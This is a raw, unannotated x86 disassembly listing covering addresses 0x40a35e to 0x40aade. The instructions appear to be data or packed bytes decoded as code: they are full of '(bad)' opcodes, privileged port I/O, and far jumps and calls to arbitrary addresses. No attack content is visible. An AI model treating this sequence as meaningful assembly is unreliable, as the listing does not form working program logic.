  40a35e:	jb     0x40a33a
  40a360:	xor    dh,BYTE PTR [ebp-0x51]
  40a363:	inc    cl
  40a365:	imul   edi,esp,0xffffffb8
  40a368:	sub    eax,0x14879d9b
  40a36d:	sub    DWORD PTR [esi-0x57165e0],ecx
  40a373:	shl    ebx,0x74
  40a376:	imul   eax,DWORD PTR [ebp+0x5],0xffffffcc
  40a37a:	idiv   DWORD PTR [ebp-0x1a913540]
  40a380:	and    al,0xe4
  40a382:	in     eax,dx
  40a383:	lea    esp,[ebx-0x71]
  40a386:	mov    eax,0xe3ae170d
  40a38b:	shl    BYTE PTR [esp+eax*1-0x47],1
  40a38f:	imul   ebx,edx,0xd0c94e1
  40a395:	sub    al,0xee
  40a397:	sub    al,0x53
  40a399:	rep lods eax,DWORD PTR ds:[esi]
  40a39b:	push   cs
  40a39c:	bound  ecx,QWORD PTR [eax]
  40a39e:	xchg   ebp,edx
  40a3a0:	xlat   BYTE PTR ds:[ebx]
  40a3a1:	jle    0x40a411
  40a3a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3a5:	cmp    al,0xbc
  40a3a7:	icebp  
  40a3a8:	ja     0x40a39e
  40a3aa:	inc    esp
  40a3ab:	xor    DWORD PTR [eax-0x292f2837],ebp
  40a3b1:	call   0xf78468ca
  40a3b6:	sbb    edx,DWORD PTR [ecx+esi*1+0xa]
  40a3ba:	scas   al,BYTE PTR es:[edi]
  40a3bb:	xchg   DWORD PTR [eax+0x69],ebp
  40a3be:	push   ss
  40a3bf:	(bad)  
  40a3c0:	and    ah,BYTE PTR [edx]
  40a3c2:	mov    dl,0x40
  40a3c4:	(bad)  
  40a3c5:	cmp    eax,0xce007ed0
  40a3ca:	push   es
  40a3cb:	test   al,0x57
  40a3cd:	out    0xf3,eax
  40a3cf:	enter  0xe722,0x32
  40a3d3:	repnz xor DWORD PTR cs:[esi+esi*2],ebp
  40a3d8:	(bad)  
  40a3d9:	xchg   ecx,eax
  40a3da:	and    DWORD PTR [edi+0x77819ac4],edx
  40a3e0:	lds    edx,FWORD PTR [eax]
  40a3e2:	in     al,0xd2
  40a3e4:	nop
  40a3e5:	cli    
  40a3e6:	aas    
  40a3e7:	sub    esi,DWORD PTR [edi]
  40a3e9:	in     eax,0xb5
  40a3eb:	ret    0x753f
  40a3ee:	test   DWORD PTR [eax+0x3c],ebx
  40a3f1:	aaa    
  40a3f2:	aam    0xcc
  40a3f4:	or     BYTE PTR [esp+esi*8],ch
  40a3f7:	test   al,0xb8
  40a3f9:	aad    0xfc
  40a3fb:	outs   dx,DWORD PTR ds:[esi]
  40a3fc:	dec    BYTE PTR ds:0xba8fccf3
  40a402:	mov    esp,0xf6c0ed08
  40a407:	loope  0x40a486
  40a409:	push   ds
  40a40a:	mov    ds:0x6de047d3,al
  40a40f:	jle    0x40a3f6
  40a411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a412:	cdq    
  40a413:	and    eax,0xea9830f7
  40a418:	not    WORD PTR [ebp+0xe011ccd]
  40a41f:	mov    cl,0x12
  40a421:	push   esi
  40a422:	dec    ecx
  40a423:	out    0xec,al
  40a425:	(bad)  
  40a426:	jecxz  0x40a412
  40a428:	mov    ah,0xab
  40a42a:	adc    eax,0x9fce8246
  40a42f:	adc    BYTE PTR [ebx+0x0],al
  40a432:	mov    bl,0x39
  40a434:	sbb    eax,0xbdba76a9
  40a439:	cmp    edi,DWORD PTR [ecx+0x33]
  40a43c:	out    dx,al
  40a43d:	adc    cl,bl
  40a43f:	(bad)  
  40a441:	mov    ebp,0x69463fca
  40a446:	fisttp DWORD PTR [edi+0x3d]
  40a449:	pop    ds
  40a44a:	or     dl,BYTE PTR [eax+0x2fafafc1]
  40a450:	mov    bl,0x92
  40a452:	mov    dl,0x36
  40a454:	cmp    DWORD PTR [esi+0x5cb81da],ebp
  40a45a:	outs   dx,DWORD PTR ds:[esi]
  40a45b:	imul   edi,DWORD PTR [edx+0x22],0xffffff87
  40a45f:	cmp    DWORD PTR [ebx+0x13d4ec7d],edx
  40a465:	or     eax,ecx
  40a467:	sbb    BYTE PTR [ebx+0x2d],dh
  40a46a:	add    eax,0xdb305475
  40a46f:	daa    
  40a470:	ret    
  40a471:	mov    bl,0xdc
  40a473:	div    BYTE PTR [edi-0x5f8cea6f]
  40a479:	sub    al,0xe5
  40a47b:	out    0x7c,al
  40a47d:	cli    
  40a47e:	pop    edx
  40a47f:	cwde   
  40a480:	or     edx,DWORD PTR [esi]
  40a482:	mov    cl,0x25
  40a484:	stos   BYTE PTR es:[edi],al
  40a485:	ret    
  40a486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a488:	cvtps2pi mm2,QWORD PTR [eax+ecx*1+0x2d]
  40a48d:	pushf  
  40a48e:	xchg   edx,eax
  40a48f:	or     DWORD PTR [edi+0x4510ada0],ebx
  40a495:	pop    ebx
  40a496:	mov    al,ds:0x3378120c
  40a49b:	call   0xe498:0x38ab9691
  40a4a2:	mov    ds:0xf6e51f19,al
  40a4a7:	dec    ebp
  40a4a8:	rcr    edx,1
  40a4aa:	xchg   ebx,eax
  40a4ab:	push   cs
  40a4ac:	cdq    
  40a4ad:	dec    ebp
  40a4ae:	(bad)  
  40a4b0:	mov    eax,ds:0x6bdce7ef
  40a4b5:	dec    ebx
  40a4b6:	rcr    DWORD PTR [ebx],1
  40a4b8:	aas    
  40a4b9:	mov    ebp,0x12274e67
  40a4be:	inc    edi
  40a4bf:	bound  esi,QWORD PTR [ebx]
  40a4c1:	or     dl,BYTE PTR [esi-0x2e]
  40a4c4:	int    0xc6
  40a4c6:	outs   dx,DWORD PTR ds:[esi]
  40a4c7:	xchg   ebp,eax
  40a4c8:	pop    es
  40a4c9:	bound  ecx,QWORD PTR [eax-0x12416bb4]
  40a4cf:	dec    eax
  40a4d0:	xchg   ecx,eax
  40a4d1:	mov    al,0xd9
  40a4d3:	repnz sub bh,BYTE PTR [edi+0x22]
  40a4d7:	add    ch,dh
  40a4d9:	imul   ecx,DWORD PTR [ecx+0x2522a74b],0x1
  40a4e0:	in     eax,0x4e
  40a4e2:	fdivp  st(4),st
  40a4e4:	and    DWORD PTR [eax+0x70],esi
  40a4e7:	(bad)  [ebx+0x6a]
  40a4ea:	jae    0x40a53a
  40a4ec:	sahf   
  40a4ed:	outs   dx,DWORD PTR ds:[esi]
  40a4ee:	fstp   QWORD PTR [eax]
  40a4f0:	rcl    DWORD PTR [edi+0x53c5fb8f],1
  40a4f6:	jle    0x40a4c6
  40a4f8:	push   cs
  40a4f9:	pop    eax
  40a4fa:	popf   
  40a4fb:	in     al,dx
  40a4fc:	outs   dx,BYTE PTR ds:[esi]
  40a4fd:	sbb    BYTE PTR [ecx+0x59a49830],ah
  40a503:	and    edx,DWORD PTR [edx-0x56]
  40a506:	fcmovne st,st(4)
  40a508:	dec    esp
  40a509:	gs aad 0x29
  40a50c:	inc    ebp
  40a50d:	fiadd  WORD PTR [eax-0xb]
  40a510:	shl    DWORD PTR [esi],0xe9
  40a513:	pop    ecx
  40a514:	pushf  
  40a515:	retf   
  40a516:	ds popa 
  40a518:	ds xchg ecx,eax
  40a51a:	test   eax,0xa1d10665
  40a51f:	sar    bh,cl
  40a521:	dec    esp
  40a522:	mov    esp,0x3bd984a8
  40a527:	das    
  40a528:	mov    dh,0x63
  40a52a:	lods   eax,DWORD PTR ds:[esi]
  40a52b:	ds cli 
  40a52d:	das    
  40a52e:	mov    bl,0xc9
  40a530:	addr16 cmc 
  40a532:	dec    edi
  40a533:	iret   
  40a534:	pushf  
  40a535:	cmovno edx,eax
  40a538:	out    0x6,al
  40a53a:	repz sbb DWORD PTR [esi],ebx
  40a53d:	xor    esp,ebp
  40a53f:	sbb    BYTE PTR [ebx],ah
  40a541:	add    cl,0xb6
  40a544:	lds    edi,FWORD PTR [ebp-0x15]
  40a547:	inc    ebp
  40a548:	sub    eax,DWORD PTR [edx]
  40a54a:	popf   
  40a54b:	scas   al,BYTE PTR es:[edi]
  40a54c:	aaa    
  40a54d:	cmp    cl,BYTE PTR [ebx]
  40a54f:	dec    edx
  40a550:	mov    eax,ds:0x94be7752
  40a555:	dec    ebx
  40a556:	cmp    BYTE PTR [ebp-0x4f952a14],bh
  40a55c:	xor    esi,DWORD PTR [eax]
  40a55e:	mov    edi,0xce286931
  40a563:	dec    eax
  40a564:	iret   
  40a565:	jmp    0x2b28c49c
  40a56a:	add    DWORD PTR ds:0x54d2384f,0x9b55a94e
  40a574:	push   cs
  40a575:	mov    cl,0x41
  40a577:	sub    BYTE PTR [ebx],ch
  40a579:	push   ss
  40a57a:	add    DWORD PTR [esi],edi
  40a57c:	int    0xb5
  40a57e:	xor    edi,DWORD PTR [edx]
  40a580:	xor    BYTE PTR [edi-0x27],cl
  40a583:	mov    dl,0x3
  40a585:	mov    eax,ds:0xf7f8de0d
  40a58a:	add    ecx,DWORD PTR [edx+0x77]
  40a58d:	pusha  
  40a58e:	in     al,0xbb
  40a590:	dec    edx
  40a591:	and    eax,0xa0690f6
  40a596:	call   0xfdc8:0xcbbab03f
  40a59d:	xchg   esi,eax
  40a59e:	in     eax,dx
  40a59f:	into   
  40a5a0:	cs (bad) 
  40a5a3:	sub    DWORD PTR es:[esi-0x62a91f0e],ebp
  40a5aa:	pusha  
  40a5ab:	out    0xee,al
  40a5ad:	xchg   edi,ebx
  40a5af:	sbb    eax,0x39d5cfee
  40a5b4:	dec    edi
  40a5b5:	fmul   QWORD PTR [eax+0xbef788c]
  40a5bb:	lods   al,BYTE PTR ds:[esi]
  40a5bc:	mov    eax,0xdc9f1157
  40a5c1:	iret   
  40a5c2:	loope  0x40a5da
  40a5c4:	ss clc 
  40a5c6:	sub    eax,DWORD PTR [ebx]
  40a5c8:	jp     0x40a5c7
  40a5ca:	(bad)  
  40a5cb:	fdivr  DWORD PTR [ecx-0x3e7d5eb5]
  40a5d1:	fs faddp st(0),st
  40a5d4:	ret    0xfd70
  40a5d7:	mov    ebx,0xcafbe240
  40a5dc:	xchg   edi,eax
  40a5dd:	ss (bad) 
  40a5e0:	or     BYTE PTR [ecx-0x76],dl
  40a5e3:	sbb    al,0x5b
  40a5e5:	clc    
  40a5e6:	stos   BYTE PTR es:[edi],al
  40a5e7:	lahf   
  40a5e8:	dec    esi
  40a5e9:	push   eax
  40a5ea:	imul   edi,eax,0x63ed7ce8
  40a5f0:	mov    dh,0xf9
  40a5f2:	test   BYTE PTR [eiz*1+0x2b978864],cl
  40a5f9:	jbe    0x40a606
  40a5fb:	cmp    DWORD PTR [edi],edi
  40a5fd:	inc    BYTE PTR [ebp+0x53ef3b7e]
  40a603:	cdq    
  40a604:	dec    edi
  40a605:	jecxz  0x40a650
  40a607:	sti    
  40a608:	cmp    DWORD PTR [esi-0x2],ecx
  40a60b:	mov    WORD PTR [edi-0x78],?
  40a60e:	xor    dh,ch
  40a610:	frstor [edi+0x44]
  40a613:	inc    eax
  40a614:	add    ecx,ebx
  40a616:	or     eax,0xc0da3a14
  40a61b:	ins    DWORD PTR es:[edi],dx
  40a61c:	add    al,0x74
  40a61e:	xchg   ecx,eax
  40a61f:	inc    edx
  40a620:	aas    
  40a621:	adc    eax,0xbb1eef31
  40a626:	jno    0x40a655
  40a628:	add    al,0x6c
  40a62a:	adc    al,0x3c
  40a62c:	sub    eax,0x8e03a9d6
  40a631:	retf   
  40a632:	jp     0x40a5ea
  40a634:	jle    0x40a5b7
  40a636:	retf   0x439a
  40a639:	adc    esi,esp
  40a63b:	enter  0xb9b4,0xa5
  40a63f:	(bad)  
  40a640:	xlat   BYTE PTR ds:[ebx]
  40a641:	adc    eax,0x3e922a1
  40a646:	xor    BYTE PTR [esi+0x6baedc16],al
  40a64c:	and    DWORD PTR [ebp-0x2a],edx
  40a64f:	or     esi,0x853b4239
  40a655:	scas   eax,DWORD PTR es:[edi]
  40a656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a657:	test   esi,esi
  40a659:	ror    BYTE PTR [edi],1
  40a65b:	not    DWORD PTR [esi+0x2c]
  40a65e:	js     0x40a63e
  40a660:	outs   dx,BYTE PTR ds:[esi]
  40a661:	and    dh,ch
  40a663:	add    dl,BYTE PTR [ebx+0x70]
  40a666:	pop    eax
  40a667:	or     eax,0xae757943
  40a66c:	retf   
  40a66d:	mov    eax,0x17f7a2ca
  40a672:	stos   BYTE PTR es:[edi],al
  40a673:	or     eax,0x8e75c918
  40a678:	cmc    
  40a679:	mov    dl,0xdd
  40a67b:	pop    edi
  40a67c:	ret    
  40a67d:	cdq    
  40a67e:	test   ax,di
  40a681:	or     eax,0x62fbb7de
  40a686:	cs jle 0x40a633
  40a689:	inc    edi
  40a68b:	and    al,0x29
  40a68d:	xor    al,BYTE PTR [esi+ecx*8-0x1e]
  40a691:	add    DWORD PTR [ebp-0x78dc66e0],edx
  40a697:	and    al,BYTE PTR [esi+edi*1+0x20763ddc]
  40a69e:	fstp   QWORD PTR [ecx]
  40a6a0:	idiv   BYTE PTR [esi+0x32527703]
  40a6a6:	mov    ah,0xc
  40a6a8:	in     eax,0x4d
  40a6aa:	sub    esp,DWORD PTR [eax]
  40a6ac:	aad    0x9d
  40a6ae:	in     eax,0x5
  40a6b0:	inc    edx
  40a6b1:	mov    ?,WORD PTR [ecx-0xa]
  40a6b4:	out    dx,al
  40a6b5:	push   edi
  40a6b6:	ds in  al,0xbe
  40a6b9:	sub    ch,0x74
  40a6bc:	add    eax,0xb4bea52f
  40a6c1:	imul   edx,esi,0x2e8ca4b
  40a6c7:	sbb    DWORD PTR [ebp-0x5f6c484],esi
  40a6cd:	sub    DWORD PTR [ebx+ecx*4],0x4197b301
  40a6d4:	in     al,0xb7
  40a6d6:	enter  0xf921,0x8f
  40a6da:	lock cmc 
  40a6dc:	stos   DWORD PTR es:[edi],eax
  40a6dd:	xor    esp,DWORD PTR [ebx]
  40a6df:	cmp    BYTE PTR [ebp+0x6aca7966],bh
  40a6e5:	mov    bh,0x6d
  40a6e7:	sti    
  40a6e8:	cmp    al,0x45
  40a6ea:	sub    edx,DWORD PTR [ebx+0x20]
  40a6ed:	cmp    DWORD PTR [esi+0x46b26ce],ebp
  40a6f3:	xor    ebx,esi
  40a6f5:	or     ah,bh
  40a6f7:	dec    eax
  40a6f8:	inc    esi
  40a6f9:	fldenv [edx]
  40a6fb:	inc    eax
  40a6fc:	inc    ebp
  40a6fd:	jb     0x40a75c
  40a6ff:	je     0x40a699
  40a701:	retf   0x382a
  40a704:	push   ebp
  40a705:	ds or  eax,0x249b4804
  40a70b:	xchg   ebp,eax
  40a70c:	add    eax,0x878f40da
  40a711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a712:	call   0x145f:0x2af50d1c
  40a719:	xchg   ecx,eax
  40a71a:	push   0xf94755f5
  40a71f:	pop    ecx
  40a720:	stos   BYTE PTR es:[edi],al
  40a721:	jnp    0x40a72e
  40a723:	(bad)  
  40a724:	not    DWORD PTR [ecx+0x7f]
  40a727:	mov    ebp,0xb4808adf
  40a72c:	scas   al,BYTE PTR es:[edi]
  40a72d:	sbb    BYTE PTR [esi+0x1f8c4967],bl
  40a733:	add    edi,DWORD PTR [ecx+0x1e]
  40a736:	mov    al,ds:0x76054864
  40a73b:	xlat   BYTE PTR ds:[ebx]
  40a73c:	push   0x7489476a
  40a741:	rcr    DWORD PTR [ecx],cl
  40a743:	mov    esp,DWORD PTR [ebp+0x148c16a4]
  40a749:	jne    0x40a6f2
  40a74b:	sub    bl,dh
  40a74d:	(bad)  
  40a74f:	int3   
  40a750:	mov    ds:0xcc81256f,al
  40a755:	push   0xffffffc6
  40a757:	bound  eax,QWORD PTR [ecx+edx*8+0x65]
  40a75b:	aas    
  40a75c:	std    
  40a75d:	cmp    BYTE PTR [ebp+0x0],dl
  40a760:	jecxz  0x40a7c0
  40a762:	fild   WORD PTR [edi+0x34]
  40a765:	ds push es
  40a767:	fdivrp st(4),st
  40a769:	mov    eax,ss
  40a76b:	fst    QWORD PTR [ebp+0x28]
  40a76e:	(bad)  
  40a76f:	cs (bad) 
  40a771:	test   DWORD PTR [edi-0x64ef2561],0x10400caf
  40a77b:	adc    bl,ch
  40a77d:	repz std 
  40a77f:	xchg   esi,eax
  40a780:	data16 jae 0x40a718
  40a783:	dec    eax
  40a784:	mov    al,0xa3
  40a786:	(bad)  
  40a787:	cld    
  40a788:	pop    es
  40a789:	cli    
  40a78a:	sar    edx,cl
  40a78c:	mov    esp,0x32cd2c5f
  40a791:	and    ch,BYTE PTR [ebx+0x23]
  40a794:	sbb    eax,0x3dc6b09
  40a799:	std    
  40a79a:	in     al,0xc6
  40a79c:	push   0xffffff9b
  40a79e:	jmp    0x40a748
  40a7a0:	jp     0x40a799
  40a7a2:	jmp    0x32092734
  40a7a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7a8:	push   ds
  40a7a9:	push   ecx
  40a7ab:	mov    WORD PTR [ebx+0x31660d31],fs
  40a7b1:	xor    BYTE PTR [ebp+0x52],ch
  40a7b4:	test   DWORD PTR [esi+0x166ac0c2],0x784eb00e
  40a7be:	xor    BYTE PTR [ecx],al
  40a7c0:	cdq    
  40a7c1:	xchg   edx,eax
  40a7c2:	or     eax,eax
  40a7c4:	inc    edx
  40a7c5:	jae    0x40a7d2
  40a7c7:	int3   
  40a7c8:	data16 int 0x1c
  40a7cb:	cmp    eax,0x48723285
  40a7d0:	pop    ebp
  40a7d1:	sbb    al,0x1
  40a7d3:	and    al,dh
  40a7d5:	and    esi,DWORD PTR gs:[ecx+0x79]
  40a7d9:	in     al,0x32
  40a7db:	xor    al,bl
  40a7dd:	(bad)  
  40a7df:	add    cl,dh
  40a7e1:	das    
  40a7e2:	nop    ebp
  40a7e5:	out    0x3d,al
  40a7e7:	mov    ch,0x89
  40a7e9:	clc    
  40a7ea:	bnd jp 0x40a7bc
  40a7ed:	add    al,0x4a
  40a7ef:	dec    ecx
  40a7f0:	hlt    
  40a7f1:	and    DWORD PTR [ebp*4-0x63f9233d],0xffffffed
  40a7f9:	xchg   edx,eax
  40a7fa:	repnz and ebp,eax
  40a7fd:	adc    bh,BYTE PTR [esi-0x34254f8]
  40a803:	dec    esp
  40a804:	inc    esp
  40a805:	mov    eax,ds:0x4331c598
  40a80a:	push   ebx
  40a80b:	ret    
  40a80c:	aam    0x16
  40a80e:	xlat   BYTE PTR ds:[ebx]
  40a80f:	shl    BYTE PTR [eax],cl
  40a811:	add    bl,BYTE PTR ds:0x1fb8559a
  40a817:	icebp  
  40a818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a819:	sbb    eax,0x679dd47e
  40a81e:	or     al,0x17
  40a820:	stc    
  40a821:	lahf   
  40a822:	pop    es
  40a823:	je     0x40a826
  40a825:	pop    edx
  40a826:	sub    al,0x0
  40a828:	pusha  
  40a829:	push   ss
  40a82a:	xor    al,cl
  40a82c:	jmp    0x40a7cf
  40a82e:	add    bl,dh
  40a830:	add    al,0x4b
  40a832:	dec    ecx
  40a833:	and    eax,0x8b326a9
  40a838:	mov    eax,0xc8c9ab57
  40a83d:	jp     0x40a7ef
  40a83f:	imul   eax,DWORD PTR [ebx+0xe],0x6c
  40a843:	call   0x207:0x9932fcb6
  40a84a:	mov    edi,0xc7bb745a
  40a84f:	dec    ebp
  40a850:	push   eax
  40a851:	xor    eax,0xd2e653fc
  40a856:	fsubr  st,st(0)
  40a858:	jb     0x40a893
  40a85a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a85b:	and    eax,0xc87f8a9c
  40a860:	aaa    
  40a861:	dec    ecx
  40a862:	push   edx
  40a863:	push   edi
  40a864:	pop    ecx
  40a865:	dec    ecx
  40a866:	inc    ebp
  40a867:	dec    ebp
  40a868:	or     al,0xcc
  40a86a:	and    BYTE PTR [edx],dl
  40a86c:	mov    ebx,ebx
  40a86e:	sti    
  40a86f:	push   eax
  40a870:	dec    ebx
  40a871:	jns    0x40a890
  40a873:	imul   edi,DWORD PTR [edx],0x75c1479
  40a879:	retf   
  40a87a:	cmp    al,0x84
  40a87c:	fidiv  WORD PTR [eax]
  40a87e:	inc    edi
  40a87f:	adc    DWORD PTR gs:[esi+0x24ea6d55],esp
  40a886:	pop    esi
  40a887:	fidivr DWORD PTR [esi+0x67]
  40a88a:	jp     0x40a8a2
  40a88c:	(bad)  
  40a88d:	rcl    DWORD PTR [ebx-0x36],1
  40a890:	lods   al,BYTE PTR ds:[esi]
  40a891:	shr    DWORD PTR [ecx],cl
  40a893:	sbb    ch,BYTE PTR [esi-0x3c21b3d7]
  40a899:	jmp    0xa69:0x199b84e2
  40a8a0:	js     0x40a8b9
  40a8a2:	jp     0x40a873
  40a8a4:	and    al,0x24
  40a8a6:	adc    al,0xe0
  40a8a8:	xor    al,0x66
  40a8aa:	adc    ch,BYTE PTR [edi+0x1f]
  40a8ad:	dec    esp
  40a8ae:	xchg   edx,eax
  40a8af:	jnp    0x40a8e1
  40a8b1:	stos   BYTE PTR es:[edi],al
  40a8b2:	mov    eax,ds:0x34c2e955
  40a8b7:	(bad)  
  40a8b8:	sbb    BYTE PTR [ebx-0x24],dh
  40a8bb:	sbb    eax,0x3d51e547
  40a8c0:	call   0x66ab6795
  40a8c5:	cwde   
  40a8c6:	push   ss
  40a8c7:	and    BYTE PTR [eax-0x31c67a07],ah
  40a8cd:	push   ss
  40a8ce:	lods   al,BYTE PTR ds:[esi]
  40a8cf:	arpl   WORD PTR [eax],dx
  40a8d1:	das    
  40a8d2:	shl    DWORD PTR [edx],0x65
  40a8d5:	inc    eax
  40a8d6:	stos   DWORD PTR es:[edi],eax
  40a8d7:	fimul  DWORD PTR [eax-0x38]
  40a8da:	lea    edx,[edx]
  40a8dc:	xchg   ebp,eax
  40a8dd:	scas   eax,DWORD PTR es:[edi]
  40a8de:	icebp  
  40a8df:	int3   
  40a8e0:	sub    eax,0xcad21c3
  40a8e5:	adc    DWORD PTR [eax-0xfc01a37],0x69
  40a8ec:	or     esp,0xf0b20cd6
  40a8f2:	(bad)  
  40a8f3:	shr    bl,cl
  40a8f5:	icebp  
  40a8f6:	ja     0x40a91a
  40a8f8:	in     eax,0x33
  40a8fa:	rcl    BYTE PTR [eax+0x7668be32],cl
  40a900:	adc    DWORD PTR [ecx],0x8
  40a903:	xchg   ebx,eax
  40a904:	lahf   
  40a905:	push   edi
  40a906:	lds    ebp,FWORD PTR [edi]
  40a908:	mov    dh,BYTE PTR [esi+0x6eab55d5]
  40a90e:	shl    bh,0x61
  40a911:	insertq xmm7,(bad),0x78,0xba
  40a915:	jbe    0x40a980
  40a917:	cmp    DWORD PTR [ebx],eax
  40a919:	aas    
  40a91a:	mov    ebx,edi
  40a91c:	sbb    eax,0x40294be5
  40a921:	les    ebx,FWORD PTR [eax]
  40a923:	fldenv [ecx-0x1593dc23]
  40a929:	mov    esi,0xaf93074e
  40a92e:	cmc    
  40a92f:	sub    DWORD PTR [ebx-0x8],0xffffffce
  40a933:	cmp    bl,dh
  40a935:	xchg   edx,eax
  40a936:	dec    esi
  40a937:	data16 mov cl,0x92
  40a93a:	test   eax,0xc07f6879
  40a93f:	dec    edi
  40a940:	add    BYTE PTR [esi+0x3f7112bd],al
  40a946:	mov    edx,0xd9ee7cf8
  40a94b:	sti    
  40a94c:	adc    BYTE PTR [esi],bl
  40a94e:	data16 xchg BYTE PTR [eax],bh
  40a951:	lahf   
  40a952:	aas    
  40a953:	lock retf 0x3ff5
  40a957:	push   edx
  40a958:	jg     0x40a948
  40a95a:	cmp    BYTE PTR [eax+0x6c],0x34
  40a95e:	out    0x41,al
  40a960:	or     BYTE PTR [ebp-0x7df3287c],ah
  40a966:	jno    0x40a9b8
  40a968:	hlt    
  40a969:	(bad)  
  40a96a:	out    dx,al
  40a96b:	(bad)  
  40a96c:	pop    ecx
  40a96d:	int3   
  40a96e:	fdiv   st,st(4)
  40a970:	aaa    
  40a971:	dec    eax
  40a972:	outs   dx,DWORD PTR ds:[esi]
  40a973:	dec    ecx
  40a974:	int    0x43
  40a976:	ins    DWORD PTR es:[edi],dx
  40a977:	(bad)  
  40a978:	lock and DWORD PTR [ebx+0x2d],0x5b
  40a97d:	das    
  40a97e:	out    0xa9,al
  40a980:	mov    al,ds:0xcd2c7ef9
  40a985:	inc    ebx
  40a986:	pop    esp
  40a987:	loope  0x40a97d
  40a989:	jle    0x40a954
  40a98b:	aam    0xdd
  40a98d:	shl    BYTE PTR [ebp+0xd5c3911],cl
  40a993:	jmp    FWORD PTR ds:0x43f95b1d
  40a999:	sub    ebx,edx
  40a99b:	iret   
  40a99c:	adc    eax,DWORD PTR [esi+0x26f06f41]
  40a9a2:	xor    BYTE PTR [bx+0x43],bh
  40a9a6:	and    eax,0xe375289e
  40a9ab:	pop    edx
  40a9ac:	mov    cl,0x29
  40a9ae:	je     0x40a9cc
  40a9b0:	stos   BYTE PTR es:[edi],al
  40a9b1:	lds    eax,FWORD PTR [eax-0xe16e352]
  40a9b7:	mov    dl,0x7b
  40a9b9:	and    DWORD PTR [ebx+0x2f],esi
  40a9bc:	jmp    DWORD PTR [eax+edx*4-0x11]
  40a9c0:	outs   dx,DWORD PTR ds:[esi]
  40a9c1:	adc    eax,0xc33509f6
  40a9c6:	push   esp
  40a9c7:	mov    ebp,0x30b63212
  40a9cc:	cdq    
  40a9cd:	neg    DWORD PTR [eax]
  40a9cf:	sub    eax,0x53dd783
  40a9d4:	add    cl,BYTE PTR [edi+0x68e5258d]
  40a9da:	shl    DWORD PTR [eax+0x16],cl
  40a9dd:	(bad)  
  40a9de:	or     al,0xd0
  40a9e0:	jmp    0x3e77:0x999ca7a1
  40a9e7:	pop    eax
  40a9e8:	leave  
  40a9e9:	or     DWORD PTR [ecx-0x43c63b2a],esi
  40a9ef:	lock cdq 
  40a9f1:	in     eax,dx
  40a9f2:	mov    BYTE PTR [ebp+edi*1-0x3896b58d],al
  40a9f9:	cmp    al,0xb6
  40a9fb:	sti    
  40a9fc:	push   esp
  40a9fd:	pusha  
  40a9fe:	fsubr  st,st(0)
  40aa00:	push   0xffffffea
  40aa02:	inc    ecx
  40aa03:	cmp    esi,DWORD PTR [edi]
  40aa05:	je     0x40aa42
  40aa07:	mov    ecx,0x541c974
  40aa0c:	imul   edx,DWORD PTR ds:[esi+ebx*2-0x24],0x6c
  40aa12:	not    DWORD PTR [esi-0x53]
  40aa15:	sbb    eax,0xb9c192e3
  40aa1a:	adc    eax,0x7d9f7c24
  40aa1f:	stos   BYTE PTR es:[edi],al
  40aa20:	dec    edx
  40aa21:	fistp  WORD PTR [edi+0x2]
  40aa24:	mov    ds:0xb6417ed4,eax
  40aa29:	aaa    
  40aa2a:	ins    DWORD PTR es:[edi],dx
  40aa2b:	in     al,0x7f
  40aa2d:	sub    al,ah
  40aa2f:	(bad)  
  40aa30:	mov    ebp,0x8dbf52d6
  40aa35:	out    dx,eax
  40aa36:	cmp    eax,0x637664a0
  40aa3b:	and    DWORD PTR [edi],ebx
  40aa3d:	or     ecx,0x60
  40aa40:	mov    ecx,0x34ae633f
  40aa45:	push   0x3d
  40aa47:	ror    bl,cl
  40aa49:	mov    DWORD PTR [edi-0x6bd66090],0x18c7a90d
  40aa53:	repz rcl DWORD PTR [eax+eiz*2+0x685c68fc],0x99
  40aa5c:	mov    cl,0x31
  40aa5e:	push   0xffffffc5
  40aa60:	inc    edi
  40aa61:	mov    esp,edx
  40aa63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa64:	dec    ebx
  40aa65:	inc    eax
  40aa66:	pusha  
  40aa67:	fadd   st(3),st
  40aa69:	out    0xcf,eax
  40aa6b:	shl    bh,cl
  40aa6d:	dec    edi
  40aa6e:	mov    ds:0x3bfc2aae,al
  40aa73:	mov    ebx,0x8a4a9377
  40aa78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa79:	clc    
  40aa7a:	sti    
  40aa7b:	(bad)  
  40aa7d:	pop    ebx
  40aa7e:	push   esp
  40aa7f:	cmp    DWORD PTR [ebx-0x63ecead3],ebx
  40aa85:	jne    0x40aaca
  40aa87:	add    dl,BYTE PTR [ebx]
  40aa89:	adc    DWORD PTR [edi],ecx
  40aa8b:	neg    DWORD PTR [esi+0x3ecf4ced]
  40aa91:	mov    ch,0xaf
  40aa93:	jg     0x40aa47
  40aa95:	rcl    BYTE PTR ds:0x100289e,1
  40aa9b:	rol    edx,0xd
  40aa9e:	pop    esi
  40aa9f:	push   eax
  40aaa0:	push   es
  40aaa1:	add    bh,0x40
  40aaa4:	add    eax,0x7eb5aafa
  40aaa9:	(bad)  
  40aaaa:	in     al,0x18
  40aaac:	ret    
  40aaad:	sbb    DWORD PTR [ebp+0x4a405f19],esi
  40aab3:	adc    DWORD PTR [eax+0x1047543c],ecx
  40aab9:	je     0x40aa4f
  40aabb:	adc    DWORD PTR [ebp-0x30],ebx
  40aabe:	or     DWORD PTR [ebp+ebx*1-0x6e],esi
  40aac2:	(bad)  
  40aac3:	xchg   edi,eax
  40aac4:	iret   
  40aac5:	inc    eax
  40aac6:	loopne 0x40aa86
  40aac8:	arpl   cx,di
  40aaca:	outs   dx,DWORD PTR ds:[esi]
  40aacb:	and    bh,BYTE PTR [ecx]
  40aacd:	in     eax,dx
  40aace:	in     eax,dx
  40aacf:	(bad)  
  40aad1:	inc    edx
  40aad2:	add    al,0x96
  40aad4:	or     eax,0xd6239f4d
  40aad9:	and    ch,ah
  40aadb:	xor    BYTE PTR [edx+eax*1],dl
  40aade:	xor    bl,dl
